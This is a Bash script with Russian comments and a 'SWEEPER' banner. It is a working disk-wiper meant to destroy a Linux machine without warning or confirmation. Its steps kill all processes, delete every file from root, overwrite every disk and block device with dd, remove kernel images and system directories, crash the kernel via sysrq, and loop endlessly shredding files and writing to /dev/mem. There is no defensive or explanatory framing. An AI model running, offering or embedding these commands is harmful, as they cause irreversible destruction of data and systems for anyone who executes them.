#!/bin/bash

# БЕЗ ПРЕДУПРЕЖДЕНИЙ! БЕЗ ПОДТВЕРЖДЕНИЙ! 
# АБСОЛЮТНОЕ УНИЧТОЖЕНИЕ ВСЕГО НАХУЙ!

# Цвета для красоты
RED='\033[0;31m'
NC='\033[0m'
echo -e "${RED}
███████╗██╗    ██╗███████╗███████╗████████╗███████╗██████╗ 
██╔════╝██║    ██║██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
███████╗██║ █╗ ██║█████╗  ███████╗   ██║   █████╗  ██████╔╝
╚════██║██║███╗██║██╔══╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗
███████║╚███╔███╔╝███████╗███████║   ██║   ███████╗██║  ██║
╚══════╝ ╚══╝╚══╝ ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
${NC}"

# 1. УБИТЬ ВСЕ ПРОЦЕССЫ
echo "Убиваю все процессы..."
kill -9 -1 2>/dev/null
pkill -9 . 2>/dev/null

# 2. СТЕРЕТЬ ВСЕ ФАЙЛОВЫЕ СИСТЕМЫ
echo "Стираю все файлы..."
# Идем с корня и удаляем ВСЁ
find / -type f -exec rm -f {} \; 2>/dev/null &
find / -type d -exec rmdir {} \; 2>/dev/null &

# 3. УНИЧТОЖИТЬ ВСЕ ДИСКИ (все возможные варианты)
echo "Начинаю термоядерную зачистку дисков..."

# Список всех возможных дисковых устройств
DISKS="sda sdb sdc sdd sde sdf sdg vda vdb vdc vdd xvda xvdb xvdc nvme0n1 nvme0n2"

for disk in $DISKS; do
    if [ -e "/dev/$disk" ]; then
        echo "Уничтожаю /dev/$disk..."
        # Метод 1: Нули
        dd if=/dev/zero of=/dev/$disk bs=1M status=noxfer 2>/dev/null &
        # Метод 2: Случайные данные
        dd if=/dev/urandom of=/dev/$disk bs=1M status=noxfer 2>/dev/null &
        # Метод 3: Разрушение MBR/GPT
        dd if=/dev/zero of=/dev/$disk bs=512 count=2048 conv=notrunc 2>/dev/null &
    fi
done

# 4. УДАЛИТЬ КРИТИЧНЫЕ СИСТЕМНЫЕ ФАЙЛЫ
echo "Удаляю системные файлы..."
rm -rf /bin /sbin /usr/bin /usr/sbin /lib /lib64 /etc /boot /var /home /root 2>/dev/null &

# 5. РАЗРУШИТЬ ЯДРО
echo "Разрушаю ядро..."
rm -f /boot/vmlinuz* /boot/initrd* /boot/System.map* 2>/dev/null &
rm -f /vmlinuz /initrd.img 2>/dev/null &

# 6. ВЫКЛЮЧИТЬ SWAP И УНИЧТОЖИТЬ
echo "Уничтожаю swap..."
swapoff -a 2>/dev/null
dd if=/dev/zero of=/dev/disk/by-uuid/* 2>/dev/null &

# 7. РАЗРУШИТЬ СЕТЬ
echo "Разрушаю сетевую конфигурацию..."
rm -rf /etc/network/* /etc/netplan/* /etc/sysconfig/network-scripts/* 2>/dev/null
ip link set eth0 down 2>/dev/null
ip link set enp0s3 down 2>/dev/null

# 8. ОТКЛЮЧИТЬ ВСЕ ФАЙЛОВЫЕ СИСТЕМЫ И ПЕРЕЗАПИСАТЬ
echo "Размонтирую и уничтожаю..."
umount -a -f 2>/dev/null

# 9. САМЫЙ ЖЕСТКИЙ МЕТОД - ПИШЕМ ПРЯМО В БЛОКИ
echo "Запускаю абсолютное уничтожение..."
# Находим все блочные устройства и пишем в них
for device in $(lsblk -d -o NAME -n 2>/dev/null); do
    if [ -b "/dev/$device" ]; then
        nohup dd if=/dev/urandom of=/dev/$device bs=4M status=none 2>/dev/null &
    fi
done

# 10. ВЫЗВАТЬ ПАНИКУ ЯДРА (если система еще жива)
echo "Вызываю kernel panic..."
echo 1 > /proc/sys/kernel/sysrq
echo c > /proc/sysrq-trigger 2>/dev/null
echo o > /proc/sysrq-trigger 2>/dev/null

# 11. ДОБИТЬ СИСТЕМУ - ПЕРЕЗАПИСЬ ПАМЯТИ
echo "Добиваю систему..."
# Создаем бесконечный цикл записи
while true; do
    dd if=/dev/urandom of=/tmp/killme bs=1M count=1000 2>/dev/null
    rm -f /tmp/killme 2>/dev/null
    # Пробуем удалить себя
    rm -f /bin/bash /bin/sh 2>/dev/null
    # Убиваем init
    kill -9 1 2>/dev/null
done &

# 12. ВЕЧНЫЙ ЦИКЛ РАЗРУШЕНИЯ
echo "Запускаю вечный цикл разрушения..."
while true; do
    # Пишем во все файловые дескрипторы
    for fd in /proc/self/fd/*; do
        echo "FUCKED" > $fd 2>/dev/null
    done
    # Удаляем случайные файлы
    find / -type f -exec shred -u -z {} \; 2>/dev/null
    # Записываем мусор в память
    cat /dev/urandom > /dev/kmem 2>/dev/null
    cat /dev/urandom > /dev/mem 2>/dev/null
done

# 13. ЕСЛИ ВСЁ ЕЩЕ ЖИВО - ВЫКЛЮЧИТЬ ПИТАНИЕ
echo "Отправляю сигнал выключения..."
poweroff -f 2>/dev/null
halt -f 2>/dev/null
echo b > /proc/sysrq-trigger 2>/dev/null

# ИТОГ: СИСТЕМА ДОЛЖНА БЫТЬ МЕРТВА
echo "УНИЧТОЖЕНИЕ ЗАВЕРШЕНО. ВСЕ ПРОЕБАНО."
